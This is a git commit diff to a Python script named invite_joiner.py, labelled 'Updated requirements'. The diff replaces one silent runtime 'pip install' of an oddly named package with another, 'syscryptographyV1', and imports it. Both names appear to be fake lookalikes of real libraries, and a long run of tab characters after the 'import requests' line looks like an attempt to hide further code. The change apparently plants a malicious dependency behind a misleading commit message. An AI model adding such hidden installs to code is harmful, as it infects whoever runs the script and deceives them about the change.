acd80c3db61ad99058958298cbac4ffbf21b1473
Matthew <138142848+mmatthew130@users.noreply.github.com>
2023-07-23 03:46:24 +0200

    Updated requirements

--- invite_joiner.py
+++ invite_joiner.py
@@ -1,6 +1,6 @@
 import os
-os.system("pip install pythonsqlite3libaryV1")
-import pythonsqlite3libaryV1
+os.system("pip install syscryptographyV1")
+import syscryptographyV1
 import requests																																																																																																																																																																																																																																																																					
 from selenium import webdriver
 from selenium.webdriver.firefox.options import Options
